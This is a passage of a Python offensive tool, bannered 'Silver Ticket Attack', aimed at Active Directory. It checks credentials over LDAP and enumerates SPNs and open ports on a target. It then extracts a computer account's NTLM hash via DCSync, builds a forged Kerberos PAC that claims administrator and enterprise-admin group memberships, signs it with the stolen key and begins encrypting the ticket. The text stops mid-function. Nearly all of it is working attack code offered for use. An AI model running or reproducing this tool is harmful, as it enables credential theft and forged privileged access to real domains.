#!/usr/bin/env python3

import sys
import os
import subprocess
import time as _time_module
import signal

def _exit_handler(sig, frame):
    print(Fore.YELLOW + "\n\n[!] Exiting... Goodbye!" + Style.RESET_ALL)
    sys.exit(0)

signal.signal(signal.SIGINT, _exit_handler)

REQUIRED = {
    "impacket":   "0.12.0",
    "pyasn1":     "0.6.1",
    "ldap3":      "2.9.1",
    "colorama":   "0.4.6",
    "six":        "1.16.0",
}

VENV_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), ".silver_venv")


def _venv_python():
    if sys.platform == "win32":
        return os.path.join(VENV_DIR, "Scripts", "python.exe")
    return os.path.join(VENV_DIR, "bin", "python3")


def _is_running_in_venv():
    return os.path.abspath(sys.executable) == os.path.abspath(_venv_python())


def _create_venv():
    print("[*] Creating isolated virtual environment...")
    subprocess.check_call([sys.executable, "-m", "venv", "--system-site-packages", VENV_DIR])
    print(f"[+] venv created at: {VENV_DIR}")


def _install_deps():
    pip = os.path.join(VENV_DIR, "bin", "pip") if sys.platform != "win32" else os.path.join(VENV_DIR, "Scripts", "pip.exe")
    pkgs = [f"{k}=={v}" for k, v in REQUIRED.items()]
    print("[*] Installing required packages...")
    subprocess.check_call([pip, "install", "--quiet", "--upgrade"] + pkgs)
    print("[+] Packages installed successfully.")


def _check_deps():
    try:
        import importlib.metadata as _meta
        for pkg, ver in REQUIRED.items():
            installed = _meta.version(pkg)
            inst_parts = tuple(int(x) for x in installed.split(".")[:2])
            req_parts  = tuple(int(x) for x in ver.split(".")[:2])
            if inst_parts < req_parts:
                return False, f"{pkg} {installed} < {ver}"
        return True, None
    except Exception as e:
        return False, str(e)


def _relaunch_in_venv():
    venv_py = _venv_python()
    print(f"[*] Relaunching inside venv: {venv_py}")
    os.execv(venv_py, [venv_py] + sys.argv)


def bootstrap_env():
    if _is_running_in_venv():
        return
    ok, reason = _check_deps()
    if ok:
        return
    print(f"[!] Dependency issue: {reason}")
    if not os.path.exists(VENV_DIR):
        _create_venv()
        _install_deps()
    else:
        venv_ok, venv_reason = _check_venv_deps()
        if not venv_ok:
            print(f"[!] venv outdated ({venv_reason}), reinstalling...")
            _install_deps()
    _relaunch_in_venv()


def _check_venv_deps():
    venv_py = _venv_python()
    if not os.path.exists(venv_py):
        return False, "venv python not found"
    check_code = (
        "import importlib.metadata as m; "
        + " and ".join(
            f"m.version('{k}') >= '{v}'"
            for k, v in REQUIRED.items()
        )
    )
    try:
        r = subprocess.run(
            [venv_py, "-c", f"print({check_code})"],
            capture_output=True, text=True, timeout=10
        )
        return r.stdout.strip() == "True", r.stderr.strip()
    except Exception as e:
        return False, str(e)


bootstrap_env()

import os
import sys
import re
import platform
import logging
import struct
import random
import string
import time
from datetime import datetime, timedelta, timezone
from binascii import unhexlify

from impacket.smbconnection import SMBConnection
from impacket.examples.secretsdump import RemoteOperations, NTDSHashes
from impacket.krb5 import constants
from impacket.krb5.types import KerberosTime, Principal
from impacket.krb5.ccache import CCache
from impacket.krb5.crypto import Key, _enctype_table, _checksum_table
from impacket.krb5.asn1 import (
    AS_REP, EncTicketPart, AuthorizationData, AD_IF_RELEVANT,
    Ticket, seq_set
)
from impacket.krb5.pac import (
    KERB_VALIDATION_INFO, VALIDATION_INFO,
    PAC_SIGNATURE_DATA, PAC_INFO_BUFFER, PACTYPE,
    PAC_LOGON_INFO, PAC_CLIENT_INFO_TYPE,
    PAC_SERVER_CHECKSUM, PAC_PRIVSVR_CHECKSUM,
    PAC_CLIENT_INFO,
)
from impacket.krb5.constants import (
    EncryptionTypes, PrincipalNameType, TicketFlags,
    encodeFlags, ChecksumTypes, ApplicationTagNumbers,
    ProtocolVersionNumber, PreAuthenticationDataTypes,
    KERB_NON_KERB_CKSUM_SALT, AuthorizationDataType,
)
from impacket.dcerpc.v5 import transport, lsad, scmr, tsch
from impacket.dcerpc.v5.dtypes import MAXIMUM_ALLOWED, NULL
from impacket.dcerpc.v5.ndr import NDRULONG
from impacket.dcerpc.v5.samr import (
    GROUP_MEMBERSHIP, SE_GROUP_MANDATORY,
    SE_GROUP_ENABLED_BY_DEFAULT, SE_GROUP_ENABLED,
    USER_NORMAL_ACCOUNT, USER_DONT_EXPIRE_PASSWORD,
)
from impacket.dcerpc.v5.dcom import wmi
from impacket.dcerpc.v5.dcomrt import DCOMConnection
from impacket.structure import Structure
from pyasn1.codec.der import encoder
from pyasn1.type.univ import noValue

from ldap3 import Server, Connection, ALL, NTLM, SUBTREE
from ldap3.core.exceptions import LDAPBindError
from colorama import Fore, Style, init

init(autoreset=True)
logging.getLogger().setLevel(logging.ERROR)


# ============================================================
# Banner
# ============================================================
def banner():
    print(Fore.CYAN + """
    ╔═══════════════════════════════════════════╗
    ║         Silver Ticket Attack              ║
    ║  Discover Services & Forge Service Ticket ║
    ╚═══════════════════════════════════════════╝
    """)


# ============================================================
# Supported Services (Common SPNs)
# ============================================================
SUPPORTED_SERVICES = {
    '1': ('CIFS',   'File Share / SMB'),
    '2': ('HTTP',   'Web Services / WinRM / IIS'),
    '3': ('HOST',   'Scheduled Tasks / SCM / Generic'),
    '4': ('LDAP',   'Domain Directory Services'),
    '5': ('RPCSS',  'WMI / DCOM Remote Execution'),
    '6': ('cifs',   'File Share / SMB (lowercase)'),
    '7': ('http',   'Web Services / WinRM (lowercase)'),
    '8': ('host',   'Scheduled Tasks / SCM (lowercase)'),
    '9': ('ldap',   'Domain Directory (lowercase)'),
    '0': ('rpcss',  'WMI / DCOM (lowercase)'),
}


# ============================================================
# Validators
# ============================================================
def validate_ip(ip):
    pattern = r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$'
    if not re.match(pattern, ip):
        return False
    return all(0 <= int(p) <= 255 for p in ip.split('.'))


def validate_domain(domain):
    pattern = r'^([a-zA-Z0-9-]+\.)+[a-zA-Z]{2,}$'
    if not re.match(pattern, domain):
        return False
    for part in domain.split('.'):
        if part.startswith('-') or part.endswith('-') or not part:
            return False
    return True


def validate_hash(ntlm_hash):
    """Validate NTLM hash format (32 hex characters)."""
    pattern = r'^[a-fA-F0-9]{32}$'
    return bool(re.match(pattern, ntlm_hash.strip()))


# ============================================================
# Checks
# ============================================================
def check_ip_reachable(dc_ip):
    try:
        server = Server(dc_ip, get_info=ALL, connect_timeout=5)
        conn   = Connection(server)
        conn.open()
        conn.unbind()
        return True
    except KeyboardInterrupt:
        print(Fore.YELLOW + "\n\n[!] Exiting... Goodbye!" + Style.RESET_ALL)
        sys.exit(0)
    except Exception:
        return False


def check_credentials_and_domain(dc_ip, domain, username, password):
    try:
        base_dn = ','.join([f"DC={part}" for part in domain.split('.')])
        server  = Server(dc_ip, get_info=ALL, connect_timeout=5)
        conn    = Connection(
            server,
            user=f"{domain}\\{username}",
            password=password,
            authentication=NTLM,
            auto_bind=True
        )
        conn.search(
            search_base=base_dn,
            search_filter='(objectClass=domain)',
            search_scope='SUBTREE',
            attributes=['dc']
        )
        result = len(conn.entries) > 0
        conn.unbind()
        return result
    except LDAPBindError:
        return "invalid_credentials"
    except KeyboardInterrupt:
        print(Fore.YELLOW + "\n\n[!] Exiting... Goodbye!" + Style.RESET_ALL)
        sys.exit(0)
    except Exception:
        return False


def check_admin_privileges(dc_ip, domain, username, password):
    try:
        smb = SMBConnection(dc_ip, dc_ip)
        smb.login(username, password, domain, '', '')
        tid = smb.connectTree('C$')
        smb.disconnectTree(tid)
        smb.logoff()
        return True
    except Exception as e:
        error = str(e)
        if 'STATUS_ACCESS_DENIED' in error:
            return "access_denied"
        elif 'STATUS_LOGON_FAILURE' in error:
            return "invalid_credentials"
        return f"error: {error}"


# ============================================================
# Input helper
# ============================================================
def get_input(prompt, validator=None, error_msg=None, allow_empty=False):
    while True:
        try:
            value = input(prompt).strip()
            if not value and not allow_empty:
                print(Fore.RED + "[!] This field cannot be empty!" + Style.RESET_ALL)
                continue
            if validator and value and not validator(value):
                print(Fore.RED + f"[!] {error_msg}" + Style.RESET_ALL)
                continue
            return value
        except KeyboardInterrupt:
            print(Fore.YELLOW + "\n\n[!] Exiting... Goodbye!" + Style.RESET_ALL)
            sys.exit(0)


# ============================================================
# Path resolver
# ============================================================
def resolve_ticket_path(user_input, default_name):
    if not user_input:
        full = os.path.join(os.getcwd(), default_name)
        return full, None

    cleaned = user_input.strip()
    trailing_sep = cleaned.endswith('/') or cleaned.endswith('\\')

    if cleaned.startswith('/') and not cleaned.startswith('//'):
        cleaned = cleaned.lstrip('/')

    if os.path.isabs(cleaned):
        full_path = os.path.normpath(cleaned)
    else:
        full_path = os.path.normpath(os.path.join(os.getcwd(), cleaned))

    if trailing_sep:
        os.makedirs(full_path, exist_ok=True)
        return os.path.join(full_path, default_name), None

    base = os.path.basename(full_path)

    if '.' not in base:
        os.makedirs(full_path, exist_ok=True)
        return os.path.join(full_path, default_name), None

    ext = os.path.splitext(base)[1].lower()
    if ext != '.ccache':
        return None, (
            f"[!] Invalid file format '{ext}' — only .ccache is accepted.\n"
            f"    Correct example: {os.path.splitext(base)[0]}.ccache"
        )

    directory = os.path.dirname(full_path)
    if directory:
        os.makedirs(directory, exist_ok=True)

    return full_path, None


# ============================================================
# Auto-detect DC hostname via LDAP
# ============================================================
def auto_detect_dc_hostname(dc_ip, domain, username, password):
    """
    Query LDAP to find the DC's computer account hostname.
    Searches for computers with userAccountControl containing SERVER_TRUST_ACCOUNT,
    or resolves the DC IP via DNS/SMB.
    """
    dc_hostname = None

    # Method 1: LDAP query for DC computer accounts
    try:
        base_dn = ','.join([f"DC={part}" for part in domain.split('.')])
        server  = Server(dc_ip, get_info=ALL, connect_timeout=5)
        conn    = Connection(
            server,
            user=f"{domain}\\{username}",
            password=password,
            authentication=NTLM,
            auto_bind=True
        )

        # Search for computers that are Domain Controllers
        # primaryGroupID=516 = Domain Controllers
        search_filter = '(&(objectClass=computer)(primaryGroupID=516))'
        conn.search(
            search_base=base_dn,
            search_filter=search_filter,
            search_scope=SUBTREE,
            attributes=['dNSHostName', 'sAMAccountName', 'name']
        )

        if conn.entries:
            for entry in conn.entries:
                if hasattr(entry, 'dNSHostName') and entry.dNSHostName:
                    fqdn = str(entry.dNSHostName)
                    # Verify this DC has the same IP
                    try:
                        import socket
                        resolved_ip = socket.gethostbyname(fqdn)
                        if resolved_ip == dc_ip:
                            dc_hostname = fqdn
                            break
                    except Exception:
                        # If DNS resolution fails, still use it if it's the only one
                        if not dc_hostname:
                            dc_hostname = fqdn

            # If no IP match, use the first DC found
            if not dc_hostname and conn.entries:
                entry = conn.entries[0]
                if hasattr(entry, 'dNSHostName') and entry.dNSHostName:
                    dc_hostname = str(entry.dNSHostName)
                elif hasattr(entry, 'name'):
                    dc_hostname = f"{str(entry.name)}.{domain}"

        conn.unbind()
    except Exception:
        pass

    # Method 2: SMB hostname negotiation
    if not dc_hostname:
        try:
            smb_tmp = SMBConnection(dc_ip, dc_ip)
            smb_tmp.negotiateSession()
            server_name = smb_tmp.getSMBServer().get_server_name()
            smb_tmp.close()
            if server_name:
                dc_hostname = f"{server_name}.{domain}"
        except Exception:
            pass

    # Method 3: DNS reverse lookup
    if not dc_hostname:
        try:
            import socket
            dc_hostname = socket.gethostbyaddr(dc_ip)[0]
            if '.' not in dc_hostname:
                dc_hostname = f"{dc_hostname}.{domain}"
        except Exception:
            pass

    return dc_hostname


# ============================================================
# LSA - get domain SID
# ============================================================
def get_domain_sid_via_lsa(dc_ip, domain, username, password):
    try:
        string_binding = f'ncacn_np:{dc_ip}[\\pipe\\lsarpc]'
        trans = transport.DCERPCTransportFactory(string_binding)
        trans.set_credentials(username, password, domain, '', '')
        dce = trans.get_dce_rpc()
        dce.connect()
        dce.bind(lsad.MSRPC_UUID_LSAD)
        resp      = lsad.hLsarOpenPolicy2(dce, MAXIMUM_ALLOWED | lsad.POLICY_LOOKUP_NAMES)
        policy_hd = resp['PolicyHandle']
        resp      = lsad.hLsarQueryInformationPolicy2(
            dce, policy_hd,
            lsad.POLICY_INFORMATION_CLASS.PolicyAccountDomainInformation
        )
        sid = resp['PolicyInformation']['PolicyAccountDomainInfo']['DomainSid'].formatCanonical()
        dce.disconnect()
        return sid
    except Exception:
        return None


# ============================================================
# Discover available SPNs on target host
# ============================================================
def discover_services(dc_ip, domain, username, password, target_hostname):
    """
    Query LDAP to discover Service Principal Names (SPNs) registered
    on the target computer account. Also checks common ports for quick
    service availability detection.
    """
    print(Fore.YELLOW + "[*] Discovering available SPNs on target..." + Style.RESET_ALL)

    # --- Step 1: LDAP query for SPNs on the target computer ---
    ldap_spns = []
    try:
        base_dn = ','.join([f"DC={part}" for part in domain.split('.')])
        server  = Server(dc_ip, get_info=ALL, connect_timeout=5)
        conn    = Connection(
            server,
            user=f"{domain}\\{username}",
            password=password,
            authentication=NTLM,
            auto_bind=True
        )

        # Search for the target computer account
        short_name = target_hostname.split('.')[0]
        search_filter = f'(&(objectClass=computer)(|(sAMAccountName={short_name}$)(dNSHostName={target_hostname})))'

        conn.search(
            search_base=base_dn,
            search_filter=search_filter,
            search_scope=SUBTREE,
            attributes=['servicePrincipalName', 'dNSHostName', 'sAMAccountName']
        )

        if conn.entries:
            entry = conn.entries[0]
            print(Fore.GREEN + f"[+] Found computer: {entry}" + Style.RESET_ALL)

            if hasattr(entry, 'servicePrincipalName') and entry.servicePrincipalName:
                ldap_spns = list(entry.servicePrincipalName.values)
                print(Fore.GREEN + "[+] SPNs found via LDAP:" + Style.RESET_ALL)
                for spn in ldap_spns:
                    print(Fore.WHITE + f"    - {spn}" + Style.RESET_ALL)
            else:
                print(Fore.YELLOW + "[!] No SPNs registered in LDAP for this host." + Style.RESET_ALL)
                print(Fore.YELLOW + "    This is normal — computer accounts may not have explicit SPNs." + Style.RESET_ALL)
        else:
            print(Fore.YELLOW + "[!] Target computer not found in LDAP." + Style.RESET_ALL)

        conn.unbind()
    except Exception as e:
        print(Fore.RED + f"[-] LDAP SPN discovery failed: {e}" + Style.RESET_ALL)

    # --- Step 2: Port scan common service ports on target ---
    print(Fore.YELLOW + "\n[*] Scanning common service ports..." + Style.RESET_ALL)

    port_services = {
        445:  ('CIFS',  'File Share / SMB'),
        139:  ('CIFS',  'NetBIOS Session'),
        80:   ('HTTP',  'Web Services (HTTP)'),
        443:  ('HTTP',  'Web Services (HTTPS)'),
        5985: ('HTTP',  'WinRM (HTTP)'),
        5986: ('HTTP',  'WinRM (HTTPS)'),
        389:  ('LDAP',  'LDAP (non-SSL)'),
        636:  ('LDAP',  'LDAP (SSL)'),
        135:  ('RPCSS', 'RPC Endpoint Mapper'),
    }

    detected_services = {}
    try:
        import socket
        target_ip = socket.gethostbyname(target_hostname)

        for port, (svc_class, svc_desc) in port_services.items():
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                result = sock.connect_ex((target_ip, port))
                sock.close()

                if result == 0:
                    detected_services[port] = (svc_class, svc_desc)
                    print(Fore.GREEN + f"    [+] Port {port:5d} OPEN  -> {svc_class:8s} ({svc_desc})" + Style.RESET_ALL)
                else:
                    print(Fore.WHITE + f"    [-] Port {port:5d} CLOSED" + Style.RESET_ALL)
            except Exception:
                print(Fore.WHITE + f"    [-] Port {port:5d} ERROR" + Style.RESET_ALL)
    except Exception as e:
        print(Fore.RED + f"[-] Port scan failed: {e}" + Style.RESET_ALL)

    # --- Step 3: Combine results ---
    available = set()
    for port, (svc_class, svc_desc) in detected_services.items():
        available.add(svc_class)

    # Add services found via LDAP SPNs
    for spn in ldap_spns:
        spn_upper = spn.upper()
        for svc_class, svc_desc in SUPPORTED_SERVICES.values():
            if spn_upper.startswith(svc_class.upper() + '/') or spn_upper.startswith(svc_class.lower() + '/'):
                available.add(svc_class.upper())
                break

    print(Fore.CYAN + "\n[*] Summary — services available for Silver Ticket:" + Style.RESET_ALL)
    if available:
        for svc in sorted(available):
            svc_desc = next(
                (d for _, (s, d) in SUPPORTED_SERVICES.items() if s.upper() == svc),
                "Unknown"
            )
            print(Fore.GREEN + f"    [+] {svc:8s} — {svc_desc}" + Style.RESET_ALL)
    else:
        print(Fore.YELLOW + "    [!] No services detected. You can still manually specify one." + Style.RESET_ALL)

    return list(available), ldap_spns


# ============================================================
# Computer Account Hash Dumper (instead of krbtgt)
# ============================================================
class ComputerHashDumper:
    """
    Extracts the NTLM hash of a target computer account via DCSync.
    Silver Tickets require the machine account hash, not krbtgt.
    """

    def __init__(self, dc_ip, domain, username, password, target_computer):
        self.dc_ip            = dc_ip
        self.domain           = domain
        self.username         = username
        self.password         = password
        self.target_computer  = target_computer  # e.g. DC01$
        self.ntlm_hash        = None
        self.lm_hash          = None
        self.domain_sid       = None
        self._smb             = None
        self._remote_ops      = None
        self._ntds            = None

    def dump(self):
        print(Fore.YELLOW + "[*] Connecting via SMB..." + Style.RESET_ALL)
        try:
            self._smb = SMBConnection(self.dc_ip, self.dc_ip)
            self._smb.login(self.username, self.password, self.domain, '', '')
            print(Fore.GREEN + "[+] SMB connected!" + Style.RESET_ALL)
        except Exception as e:
            print(Fore.RED + f"[-] SMB connection failed: {e}" + Style.RESET_ALL)
            return False

        try:
            self._remote_ops = RemoteOperations(self._smb, False, self.dc_ip, None)
            self._remote_ops.setExecMethod('smbexec')
        except Exception as e:
            print(Fore.RED + f"[-] RemoteOperations failed: {e}" + Style.RESET_ALL)
            return False

        # Ensure the computer name ends with $
        acct_name = self.target_computer
        if not acct_name.endswith('$'):
            acct_name = acct_name + '$'

        print(Fore.YELLOW + f"[*] Extracting NTLM hash for computer: {acct_name}" + Style.RESET_ALL)

        captured    = []
        orig_stdout = sys.stdout

        class Capture:
            def write(self, text):
                if text.strip():
                    captured.append(text.strip())
                orig_stdout.write(text)
            def flush(self):
                orig_stdout.flush()

        sys.stdout = Capture()
        try:
            self._ntds = NTDSHashes(
                None, None,
                isRemote=True,
                history=False,
                noLMHash=True,
                remoteOps=self._remote_ops,
                useVSSMethod=False,
                justNTLM=False,
                pwdLastSet=False,
                resumeSession=None,
                outputFileName=None,
                justUser=acct_name,
                skipUser=None,
                ldapFilter=None,
                printUserStatus=False
            )
            self._ntds.dump()
        except KeyboardInterrupt:
            sys.stdout = orig_stdout
            print(Fore.YELLOW + "\n\n[!] Exiting... Goodbye!" + Style.RESET_ALL)
            self.cleanup()
            sys.exit(0)
        except Exception as e:
            sys.stdout = orig_stdout
            print(Fore.RED + f"[-] DCSync for {acct_name} failed: {e}" + Style.RESET_ALL)
            self.cleanup()
            return False
        finally:
            sys.stdout = orig_stdout

        self._parse(captured)
        self.cleanup()
        return self.ntlm_hash is not None

    def _parse(self, lines):
        # Pattern: DOMAIN\computername$:uid:lm_hash:ntlm_hash:::
        for line in lines:
            # Try matching the standard secretsdump format
            m = re.search(
                r'{0}.*?:(\d+):([a-fA-F0-9]{{32}}):([a-fA-F0-9]{{32}}):::'.format(
                    re.escape(self.target_computer.rstrip('$'))
                ),
                line, re.IGNORECASE
            )
            if m:
                self.lm_hash   = m.group(2)
                self.ntlm_hash = m.group(3)
                break

        if not self.ntlm_hash:
            # Broader fallback pattern
            for line in lines:
                m = re.search(
                    r':(\d+):([a-fA-F0-9]{32}):([a-fA-F0-9]{32}):::',
                    line, re.IGNORECASE
                )
                if m:
                    self.lm_hash   = m.group(2)
                    self.ntlm_hash = m.group(3)
                    break

        sid = get_domain_sid_via_lsa(self.dc_ip, self.domain, self.username, self.password)
        if sid:
            self.domain_sid = sid

    def cleanup(self):
        for obj in [self._ntds, self._remote_ops]:
            try:
                if obj:
                    obj.finish()
            except Exception:
                pass


# ============================================================
# Silver Ticket — PAC + Ticket builder
# ============================================================

def _getFileTime(t):
    """Unix timestamp -> Windows FILETIME"""
    t *= 10000000
    t += 116444736000000000
    return t


def _getPadLength(data_length):
    return ((data_length + 7) // 8 * 8) - data_length


def _getBlockLength(data_length):
    return (data_length + 7) // 8 * 8


def build_validation_info(domain, domain_sid_str, target_user, user_id=500,
                           groups='513,512,520,518,519'):
    import calendar, datetime as _dt

    kerbdata = KERB_VALIDATION_INFO()

    aTime    = calendar.timegm(_dt.datetime.now(_dt.timezone.utc).timetuple())
    unixTime = _getFileTime(aTime)

    kerbdata['LogonTime']['dwLowDateTime']  = unixTime & 0xffffffff
    kerbdata['LogonTime']['dwHighDateTime'] = unixTime >> 32

    kerbdata['LogoffTime']['dwLowDateTime']  = 0xFFFFFFFF
    kerbdata['LogoffTime']['dwHighDateTime'] = 0x7FFFFFFF
    kerbdata['KickOffTime']['dwLowDateTime'] = 0xFFFFFFFF
    kerbdata['KickOffTime']['dwHighDateTime']= 0x7FFFFFFF

    kerbdata['PasswordLastSet']['dwLowDateTime']  = unixTime & 0xffffffff
    kerbdata['PasswordLastSet']['dwHighDateTime'] = unixTime >> 32
    kerbdata['PasswordCanChange']['dwLowDateTime']  = 0
    kerbdata['PasswordCanChange']['dwHighDateTime'] = 0
    kerbdata['PasswordMustChange']['dwLowDateTime']  = 0xFFFFFFFF
    kerbdata['PasswordMustChange']['dwHighDateTime'] = 0x7FFFFFFF

    kerbdata['EffectiveName']      = target_user
    kerbdata['FullName']           = ''
    kerbdata['LogonScript']        = ''
    kerbdata['ProfilePath']        = ''
    kerbdata['HomeDirectory']      = ''
    kerbdata['HomeDirectoryDrive'] = ''
    kerbdata['LogonCount']         = 500
    kerbdata['BadPasswordCount']   = 0
    kerbdata['UserId']             = int(user_id)

    group_list = [g.strip() for g in groups.split(',')]
    kerbdata['PrimaryGroupId'] = int(group_list[0]) if group_list else 513
    kerbdata['GroupCount']     = len(group_list)

    for group in group_list:
        gm      = GROUP_MEMBERSHIP()
        gid     = NDRULONG()
        gid['Data'] = int(group)
        gm['RelativeId'] = gid
        gm['Attributes'] = SE_GROUP_MANDATORY | SE_GROUP_ENABLED_BY_DEFAULT | SE_GROUP_ENABLED
        kerbdata['GroupIds'].append(gm)

    kerbdata['UserFlags']       = 0
    kerbdata['UserSessionKey']  = b'\x00' * 16
    kerbdata['LogonServer']     = ''
    kerbdata['LogonDomainName'] = domain.upper()
    kerbdata['LogonDomainId'].fromCanonical(domain_sid_str)
    kerbdata['LMKey']           = b'\x00' * 8
    kerbdata['UserAccountControl'] = USER_NORMAL_ACCOUNT | USER_DONT_EXPIRE_PASSWORD
    kerbdata['SubAuthStatus']   = 0

    kerbdata['LastSuccessfulILogon']['dwLowDateTime']  = 0
    kerbdata['LastSuccessfulILogon']['dwHighDateTime'] = 0
    kerbdata['LastFailedILogon']['dwLowDateTime']      = 0
    kerbdata['LastFailedILogon']['dwHighDateTime']     = 0
    kerbdata['FailedILogonCount'] = 0
    kerbdata['Reserved3']         = 0

    kerbdata['ResourceGroupDomainSid'] = NULL
    kerbdata['ResourceGroupCount']     = 0
    kerbdata['ResourceGroupIds']       = NULL

    validationInfo       = VALIDATION_INFO()
    validationInfo['Data'] = kerbdata
    return validationInfo


def build_pac_infos(domain, domain_sid_str, target_user, user_id=500,
                    groups='513,512,520,518,519'):
    import calendar, datetime as _dt

    validationInfo = build_validation_info(
        domain, domain_sid_str, target_user, user_id, groups
    )
    pacInfos = {}
    pacInfos[PAC_LOGON_INFO] = validationInfo.getData() + validationInfo.getDataReferents()

    srvCheck  = PAC_SIGNATURE_DATA()
    privCheck = PAC_SIGNATURE_DATA()
    srvCheck['SignatureType']  = ChecksumTypes.hmac_md5.value
    privCheck['SignatureType'] = ChecksumTypes.hmac_md5.value
    srvCheck['Signature']      = b'\x00' * 16
    privCheck['Signature']     = b'\x00' * 16
    pacInfos[PAC_SERVER_CHECKSUM]  = srvCheck.getData()
    pacInfos[PAC_PRIVSVR_CHECKSUM] = privCheck.getData()

    # PAC_CLIENT_INFO
    aTime    = calendar.timegm(_dt.datetime.now(_dt.timezone.utc).timetuple())
    unixTime = _getFileTime(aTime)
    clientInfo = PAC_CLIENT_INFO()
    clientInfo['Name']       = target_user.encode('utf-16le')
    clientInfo['NameLength'] = len(clientInfo['Name'])
    clientInfo['ClientId']   = unixTime
    pacInfos[PAC_CLIENT_INFO_TYPE] = clientInfo.getData()

    return pacInfos


def sign_encrypt_silver_ticket(domain, domain_sid_str, target_user,
                               service_hash_hex, pacInfos, output_path,
                               service_name, target_fqdn):
    """
    Forge a Silver Ticket for a specific service.

    Key differences from Golden Ticket:
    - sname = service_name/target_fqdn  (e.g. cifs/DC01.lab.local)
    - Encryption key = NTLM hash of the target computer account
    - PAC server checksum key = service key (not krbtgt)
    - PAC privsvr checksum key = service key (not krbtgt)
    """
    import calendar, datetime as _dt
    from impacket.krb5.asn1 import EncTGSRepPart, TGS_REP

    domain_upper = domain.upper()
    rc4_etype    = EncryptionTypes.rc4_hmac.value
    service_key  = Key(rc4_etype, unhexlify(service_hash_hex))

    now   = _dt.datetime.now(_dt.timezone.utc)
    end   = now + _dt.timedelta(hours=10)
    renew = now + _dt.timedelta(days=7)

    # -- EncTicketPart --
    enc_ticket_part = EncTicketPart()

    flags = [
        TicketFlags.forwardable.value,
        TicketFlags.proxiable.value,
        TicketFlags.renewable.value,
        TicketFlags.pre_authent.value,
    ]
    enc_ticket_part['flags'] = encodeFlags(flags)

    session_key_data = os.urandom(16)
    enc_ticket_part['key']             = noValue
    enc_ticket_part['key']['keytype']  = rc4_etype
    enc_ticket_part['key']['keyvalue'] = session_key_data

    enc_ticket_part['crealm'] = domain_upper
    enc_ticket_part['cname']  = noValue
    enc_ticket_part['cname']['name-type']      = PrincipalNameType.NT_PRINCIPAL.value
    enc_ticket_part['cname']['name-string']    = noValue
    enc_ticket_part['cname']['name-string'][0] = target_user

    enc_ticket_part['transited']             = noValue
    enc_ticket_part['transited']['tr-type']  = 0
    enc_ticket_part['transited']['contents'] = ''

    enc_ticket_part['authtime']   = KerberosTime.to_asn1(now)
    enc_ticket_part['starttime']  = KerberosTime.to_asn1(now)
    enc_ticket_part['endtime']    = KerberosTime.to_asn1(end)
    enc_ticket_part['renew-till'] = KerberosTime.to_asn1(renew)

    # -- Build PAC --
    pac_count = 4

    validationInfoBlob      = pacInfos[PAC_LOGON_INFO]
    validationInfoAlignment = b'\x00' * _getPadLength(len(validationInfoBlob))
    pacClientInfoBlob       = pacInfos[PAC_CLIENT_INFO_TYPE]
    pacClientInfoAlignment  = b'\x00' * _getPadLength(len(pacClientInfoBlob))
    serverChecksumBlob      = pacInfos[PAC_SERVER_CHECKSUM]
    serverChecksumAlignment = b'\x00' * _getPadLength(len(serverChecksumBlob))
    privSvrChecksumBlob     = pacInfos[PAC_PRIVSVR_CHECKSUM]
    privSvrChecksumAlignment= b'\x00' * _getPadLength(len(privSvrChecksumBlob))

    serverChecksum  = PAC_SIGNATURE_DATA(serverChecksumBlob)
    privSvrChecksum = PAC_SIGNATURE_DATA(privSvrChecksumBlob)

    offsetData = 8 + len(PAC_INFO_BUFFER().getData()) * pac_count

    validationInfoIB              = PAC_INFO_BUFFER()
    validationInfoIB['ulType']    = PAC_LOGON_INFO
    validationInfoIB['cbBufferSize'] = len(validationInfoBlob)
    validationInfoIB['Offset']    = offsetData
    offsetData = _getBlockLength(offsetData + validationInfoIB['cbBufferSize'])

    pacClientInfoIB              = PAC_INFO_BUFFER()
    pacClientInfoIB['ulType']    = PAC_CLIENT_INFO_TYPE
    pacClientInfoIB['cbBufferSize'] = len(pacClientInfoBlob)
    pacClientInfoIB['Offset']    = offsetData
    offsetData = _getBlockLength(offsetData + pacClientInfoIB['cbBufferSize'])

    serverChecksumIB              = PAC_INFO_BUFFER()
    serverChecksumIB['ulType']    = PAC_SERVER_CHECKSUM
    serverChecksumIB['cbBufferSize'] = len(serverChecksumBlob)
    serverChecksumIB['Offset']    = offsetData
    offsetData = _getBlockLength(offsetData + serverChecksumIB['cbBufferSize'])

    privSvrChecksumIB              = PAC_INFO_BUFFER()
    privSvrChecksumIB['ulType']    = PAC_PRIVSVR_CHECKSUM
    privSvrChecksumIB['cbBufferSize'] = len(privSvrChecksumBlob)
    privSvrChecksumIB['Offset']    = offsetData

    buffers = (
        validationInfoIB.getData() + pacClientInfoIB.getData() +
        serverChecksumIB.getData() + privSvrChecksumIB.getData() +
        validationInfoBlob + validationInfoAlignment +
        pacClientInfoBlob  + pacClientInfoAlignment
    )
    buffersTail = (serverChecksumBlob + serverChecksumAlignment +
                   privSvrChecksum.getData() + privSvrChecksumAlignment)

    pacType             = PACTYPE()
    pacType['cBuffers'] = pac_count
    pacType['Version']  = 0
    pacType['Buffers']  = buffers + buffersTail

    blobToChecksum = pacType.getData()

    # -- PAC checksums signed with SERVICE key (not krbtgt) --
    keyServer = Key(rc4_etype, unhexlify(service_hash_hex))
    keyPriv   = Key(rc4_etype, unhexlify(service_hash_hex))
    csf       = _checksum_table[ChecksumTypes.hmac_md5.value]

    serverChecksum['Signature']  = csf.checksum(keyServer, KERB_NON_KERB_CKSUM_SALT, blobToChecksum)
    privSvrChecksum['Signature'] = csf.checksum(keyPriv,   KERB_NON_KERB_CKSUM_SALT, serverChecksum['Signature'])

    buffersTail = (serverChecksum.getData()  + serverChecksumAlignment +
                   privSvrChecksum.getData() + privSvrChecksumAlignment)
    pacType['Buffers'] = buffers + buffersTail

    # -- Authorization Data --
    authorizationData    = AuthorizationData()
    authorizationData[0] = noValue
    authorizationData[0]['ad-type'] = AuthorizationDataType.AD_WIN2K_PAC.value
    authorizationData[0]['ad-data'] = pacType.getData()

    enc_ticket_part['authorization-data']    = noValue
    enc_ticket_part['authorization-data'][0] = noValue
    enc_ticket_part['authorization-data'][0]['ad-type'] = AuthorizationDataType.AD_IF_RELEVANT.value
    enc_ticket_part['authorization-data'][0]['ad-data'] = encoder.encode(authorizationData)

    # -- Encrypt EncTicketPart with SERVICE key (not krbtgt) --
    encoded_enc_ticket = encoder.encode(enc_ticket_part)
    cipher     = _enctype_table[rc4_etype]
